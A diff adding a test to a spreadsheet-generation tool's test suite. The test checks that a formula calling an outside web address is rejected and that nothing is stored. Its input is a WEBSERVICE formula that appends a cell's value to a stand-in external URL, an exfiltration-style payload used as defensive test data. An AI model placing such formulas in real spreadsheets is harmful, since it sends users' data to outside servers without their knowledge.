@@ -223,4 +223,21 @@ describe('office create_xlsx formula cells', () => {
     assert.equal(value?.formula, '1+1', 'the formula itself is kept');
     assert.equal(value?.result, undefined, 'no cached value reaches the file');
   });
+
+  it('refuses a formula that reaches outside the workbook and stores nothing', async () => {
+    const store = new InMemoryStore();
+    const tool = new OfficeTool(makeService(store), 100_000, { log: () => undefined });
+    const out = await tool.handleXlsx({
+      sheets: [
+        {
+          name: 'S',
+          columns: [{ key: 'a', header: 'A' }],
+          rows: [{ a: { formula: 'WEBSERVICE("https://example.invalid/?q="&B1)' } }],
+        },
+      ],
+    });
+    assert.match(out, /^Error: formula in sheet "S", cell A2 rejected: .*WEBSERVICE/);
+    assert.equal(tool.drain(), undefined, 'no attachment is produced');
+    assert.equal(store.size, 0, 'nothing is stored');
+  });
 });
